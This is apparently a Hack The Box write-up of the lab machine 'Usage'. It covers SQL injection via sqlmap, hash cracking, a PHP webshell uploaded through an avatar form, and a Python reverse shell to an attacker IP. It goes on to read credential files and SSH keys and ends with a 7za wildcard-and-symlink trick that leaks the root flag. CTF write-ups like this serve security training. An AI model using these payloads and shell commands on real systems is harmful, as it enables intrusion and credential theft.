---
date: 2024-05-11
title: Hack The Box — Usage
categories:
  - Writeups
  - HTB
  - CTF
tags:
  - sqli
  - 7zip_wildcard
  - file_upload
  - linux
media_subpath: /assets/images
image: usage.png
---
# TL;DR

The HackTheBox machine "Usage" is an easy Linux box featuring a Laravel-based web application vulnerable to SQL injection, allowing extraction of user credentials. Initial access is gained by discovering an admin subdomain, exploiting a file upload vulnerability to upload a PHP webshell, and obtaining a reverse shell as `www-data`. Lateral movement to the `dash` user is achieved using an SSH key, followed by switching to the `xander` user with credentials found in a configuration file. Root access is obtained by exploiting a wildcard vulnerability in a sudo-allowed binary (`usage_management`), which uses `7za` to create a backup, enabling the extraction of the root flag.

## Initial Enumeration

### Nmap Scan

To begin reconnaissance, a comprehensive Nmap scan was performed to identify open ports, services, and version information on the target machine (IP: 10.10.11.18). This is a standard first step in CTF challenges to map out potential entry points.

The command used was:

```bash
sudo nmap -sC -sV -A 10.10.11.18 -oA nmap/usage_initial_scan
```

- `-sC`: Runs default scripts for additional information.
- `-sV`: Probes for service versions.
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `-oA`: Outputs results in all formats for later reference.

**Results:**

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 05:51 EDT
Nmap scan report for 10.10.11.18
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.39 seconds
```

**Notes:**

- **SSH (Port 22)**: Running OpenSSH 8.9p1 on Ubuntu, suggesting the OS is likely Ubuntu 22.04 (Jammy Jellyfish). No immediate vulnerabilities were apparent without credentials.
- **HTTP (Port 80)**: Hosted by nginx 1.18.0, with a redirect to `http://usage.htb/`, indicating a virtual host setup. No other services like HTTPS were open.
- The redirect required adding `usage.htb` to `/etc/hosts` for local name resolution:
    
    ```bash
    echo "10.10.11.18 usage.htb" | sudo tee -a /etc/hosts
    ```
    
- No other ports were open, limiting the initial attack surface to the web service and potential SSH later.

Additional scans (e.g., full port `-p-` or UDP) confirmed only these two ports.

---

## Web Enumeration

### Main Page (usage.htb)

Navigating to `http://usage.htb/` revealed a Laravel-based blog application with a registration form, login page, and public blog posts, including one titled "Unraveling the Significance of Server-side Language Penetration Testing." The site included paths like `/dashboard`, `/login`, `/logout`, `/registration`, and `/robots.txt`.

Directory brute-forcing was performed using Dirb:

```bash
dirb http://usage.htb/ /usr/share/dirb/wordlists/common.txt
```

**Results:**

```
+ http://usage.htb/dashboard (CODE:302|SIZE:334)
+ http://usage.htb/favicon.ico (CODE:200|SIZE:0)
+ http://usage.htb/index.php (CODE:200|SIZE:5181)
+ http://usage.htb/login (CODE:200|SIZE:5141)
+ http://usage.htb/logout (CODE:302|SIZE:334)
+ http://usage.htb/registration (CODE:200|SIZE:5112)
+ http://usage.htb/robots.txt (CODE:200|SIZE:24)
```

The `/registration` page allowed creating a user account, which granted access to `/dashboard`, a user interface for managing blog posts. No sensitive data was exposed in the user dashboard.

### Virtual Host Enumeration

To discover subdomains, FFUF was used to fuzz the Host header:

```bash
ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 178
```

- `-fs 178`: Filtered out responses matching the size of an invalid host (178 bytes).

**Results:**

- `admin.usage.htb` (Status: 200, Size: 3304)

Added to `/etc/hosts`:

```bash
echo "10.10.11.18 admin.usage.htb" | sudo tee -a /etc/hosts
```

Visiting `http://admin.usage.htb/` revealed a Laravel AdminLTE dashboard with a login form:

```html
<form action="http://admin.usage.htb/admin/auth/login" method="post">
  <input type="text" class="form-control" placeholder="Username" name="username" value="">
  <input type="password" class="form-control" placeholder="Password" name="password">
  <input type="checkbox" name="remember" value="1" checked>
  <input type="hidden" name="_token" value="JMdGnqJD4wRMQL3HCYKTfvQrVlJKZqFriewAPoTI">
  <button type="submit" class="btn btn-primary btn-block btn-flat">Login</button>
</form>
```

### SQL Injection

![images (10)](images (10).png)

The `/registration` form included a password reset feature vulnerable to SQL injection. A request was captured using Burp Suite and saved as `reset_password.req`. SQLmap was used to test for vulnerabilities:

```bash
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --batch --level 5 --risk 3
```

**Results:**

- **Boolean-based blind**: `email=test@test.com' AND 3819=(SELECT (CASE WHEN (3819=3819) THEN 3819 ELSE (SELECT 5811 UNION SELECT 1136) END))-- -`
- **Time-based blind**: `email=test@test.com' AND 4024=BENCHMARK(5000000,MD5(0x7742566d))-- qFny`

Enumerated databases:

```bash
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --dbs
```

**Results:**

```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```

Dumped tables from `usage_blog`:

```bash
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --technique=B --threads 10 -D usage_blog --tables
```

**Results:**

```
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```

Dumped columns from `users` table:

```bash
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --technique=B --threads 10 -D usage_blog -T users --columns
```

**Results:**

```
Database: usage_blog
Table: users
[7 columns]
+-------------------+
| Column            |
+-------------------+
| name              | varchar(255)    |
| created_at        | timestamp       |
| email             | varchar(255)    |
| email_verified_at | timestamp       |
| id                | bigint unsigned |
| password          | varchar(255)    |
| remember_token    |
+-------------------+
```

Dumped `users` table:

```bash
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --technique=B -D usage_blog -T users --dump --fresh-queries
```

**Results:**

```
Database: usage_blog
Table: users
[2 entries]
+----+---------------+--------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
| id | email         | name   | password                                                     | created_at          | updated_at          | remember_token | email_verified_at |
+----+---------------+--------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
| 1  | raj@raj.com   | raj    | $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4. | 2023-08-17 03:16:02 | 2023-08-17 03:16:02 | NULL           | NULL              |
| 2  | raj@usage.htb | raj    | $2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa | 2023-08-22 08:55:16 | 2023-08-22 08:55:16 | NULL           | NULL              |
+----+---------------+--------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
```

Dumped `admin_users` table:

```bash
sqlmap -r ~/Documents/htb/usage/reset_password.req -p email --dbms=mysql --answers="follow=Y" --technique=B -D usage_blog -T admin_users --dump --fresh-queries
```

**Results:**

```
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
```

Cracked the bcrypt hashes using Hashcat:

```bash
hashcat -m 3200 --user creds /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

**Results:**

```
administrator:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
raj:$2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa:xander
raj:$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.:xander
```

---

## Admin Dashboard Access

Using the cracked credentials (`admin:whatever1`), logged into `http://admin.usage.htb/admin/auth/login`. The dashboard provided user management functionality, including editing user profiles with avatar uploads.

![images (11)](images (11).png)

---

## Web Exploitation

### File Upload Vulnerability

In the admin dashboard, the user edit form (`/admin/auth/users/1/edit`) allowed avatar uploads. The form was intercepted using Burp Suite to test for file upload vulnerabilities:

```http
POST /admin/auth/users/1 HTTP/1.1
Host: admin.usage.htb
Content-Type: multipart/form-data; boundary=---------------------------30014490272757962256839649296
Content-Length: 8294
...

-----------------------------30014490272757962256839649296
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_REQUEST["cmd"]); ?>
-----------------------------30014490272757962256839649296
...
```

The server accepted the PHP file, stored at `http://admin.usage.htb/uploads/images/shell.php`. Executed a reverse shell:

```bash
http://admin.usage.htb/uploads/images/shell.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.16.30%22%2C9001))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22%2Fbin%2Fbash%22)%27
```

With a Netcat listener (`nc -lvnp 9001`), a `www-data` shell was obtained and stabilized:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Lateral Movement & User Flag

As `www-data`, explored the filesystem:

```bash
cat /var/www/html/.env
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=usage_blog
DB_USERNAME=staff
DB_PASSWORD=s3cr3t_c0d3d_1uth
```

Found an SSH key for user `dash`:

```bash
cd /home/dash/.ssh
cat id_rsa
```

Hosted the key on the attacker machine:

```bash
python3 -m http.server
```

Downloaded and used the key:

```bash
wget http://10.10.16.30:8000/id_rsa
chmod 600 id_rsa
ssh dash@usage.htb -i id_rsa
```

Retrieved the user flag:

```bash
cat /home/dash/user.txt
<user_flag>
```

Checked login history:

```bash
last
```

**Results:**

```
root   pts/0    10.10.14.40      Mon Apr  8 13:17:47 +0000 2024
dash   pts/0    10.10.16.30      Sat May 11 20:32:26 +0000 2024
xander pts/0    10.10.14.9       Sat May 11 17:53:25 +0000 2024
```

Found a Monit configuration file:

```bash
cat /home/dash/.monitrc
...
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
...
```

Used the credentials to switch to `xander`:

```bash
su xander
Password: 3nc0d3d_pa$$w0rd
```

---

## Privilege Escalation

### Sudo Enumeration

Checked sudo privileges as `xander`:

```bash
sudo -l
```

**Results:**

```
User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

### Binary Analysis

Analyzed the `usage_management` binary:

```bash
strings /usr/bin/usage_management
...
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

The binary used `7za` with a wildcard (`*`) to create a ZIP archive, vulnerable to wildcard injection (reference: [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)).

Exploited the vulnerability:

```bash
cd /var/www/html
touch @root
ln -s /root/root.txt root
sudo /usr/bin/usage_management
```

Selected option 1 (Project Backup). The `7za` command included the symbolic link `root`, leaking the root flag in the output:

```
Scan WARNINGS for files and folders:
8b1a7b1dc503bee8d72142616cd06abb : No more files
```

**Root Flag:** `8b1a7b1dc503bee8d72142616cd06abb`

---

## Summary

|Step|Description|
|---|---|
|Enumeration|Nmap revealed SSH (22) and HTTP (80) with redirect to `usage.htb`. Added to `/etc/hosts`. FFUF found `admin.usage.htb`.|
|Web Recon|Dirb identified `/dashboard`, `/login`, `/registration`. SQL injection in password reset form dumped `usage_blog` database, revealing user/admin credentials (`admin:whatever1`, `raj:xander`).|
|Admin Access|Logged into `admin.usage.htb` with `admin:whatever1`. Exploited file upload in user edit form to upload a PHP webshell.|
|Initial Shell|Executed reverse shell via webshell, gaining `www-data` access. Found SSH key for `dash` in `/home/dash/.ssh`.|
|Lateral Movement|Used SSH key to access `dash` account; grabbed user flag. Found `xander:3nc0d3d_pa$$w0rd` in `.monitrc` and switched users.|
|Privilege Escalation|Exploited wildcard vulnerability in `sudo /usr/bin/usage_management` by creating a symbolic link to `/root/root.txt`, leaking the root flag.|
